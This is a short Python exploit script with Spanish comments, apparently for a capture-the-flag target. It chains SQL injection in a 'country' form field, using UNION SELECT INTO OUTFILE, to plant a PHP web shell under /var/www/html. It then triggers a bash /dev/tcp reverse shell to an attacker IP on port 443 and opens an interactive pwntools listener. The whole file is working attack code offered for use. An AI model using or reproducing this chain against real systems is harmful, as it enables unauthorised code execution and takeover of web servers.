#!/usr/bin/python3

from pwn import *
import signal, pdb, requests


def def_handler(sig, frame):
    print("\n\n[!] Saliendo...!\n")
    sys.exit(1)
# Ctrl+C


if len(sys.argv) != 3:
    log.failure("Uso:  python3 %s <ip-address> filename " % sys.argv[0] )
    sys.exit(1)

#Variables Globales
ip_address = sys.argv[1]
filename = sys.argv[2]
main_url = "http://%s/" % ip_address
lport = 443

def createFile():
    data_post = {
            'username': 'caa',
       #    'country': """Brazil' union select "<?php system($_REQUEST['cmd']); ?>" into outfile "/var/www/html/prueba.php" -- -"""  #tripe comilla para evitar errores :(
            'country': """Brazil' union select "<?php system($_REQUEST['cmd']); ?>" into outfile "/var/www/html/%s" -- -""" % (filename)  #tripe comilla para evitar errores :(
            }
    r = requests.post(main_url, data=data_post)
    

def getAccess():
    data_post = {
            'cmd': "bash -c 'bash -l >& /dev/tcp/10.10.16.8/443 0>&1'"   # ourIp here <<==!!!
            }

    r = requests.post(main_url + "%s" % filename, data=data_post)

if __name__ == '__main__':

    createFile()
   #getAccess()
    try:
        threading.Thread(target=getAccess, args=()).start()
    except Exception as e:
        log.error(str(e))

    
    shell = listen(lport, timeout=20).wait_for_connection()
    shell.interactive()
